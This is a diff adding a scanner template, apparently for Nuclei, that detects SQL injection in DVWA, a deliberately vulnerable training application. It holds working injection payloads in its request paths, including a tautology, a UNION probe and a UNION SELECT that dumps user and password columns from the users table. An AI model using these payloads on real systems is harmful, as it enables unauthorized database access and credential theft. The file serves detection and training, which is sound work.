@@ -1,0 +1,41 @@
+id: dvwa-sqli-low
+
+info:
+  name: DVWA - SQL Injection (Low Security)
+  author: vulnremediate
+  severity: critical
+  description: SQL Injection in DVWA SQL Injection module (low security)
+  tags: sqli,dvwa,php,injection
+  reference:
+    - https://github.com/digininja/DVWA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit"
+      - "{{BaseURL}}/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%20NULL,NULL--&Submit=Submit"
+      - "{{BaseURL}}/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "First name:"
+          - "Surname:"
+        condition: and
+
+      - type: word
+        words:
+          - "ID:"
+          - "First name:"
+        condition: and
+
+      - type: regex
+        regex:
+          - 'ID:\s*\d+<br\s*/?>First name:'
+
+    extractors:
+      - type: regex
+        regex:
+          - 'First name:\s*(\w+)'
+          - 'Surname:\s*(\w+)'
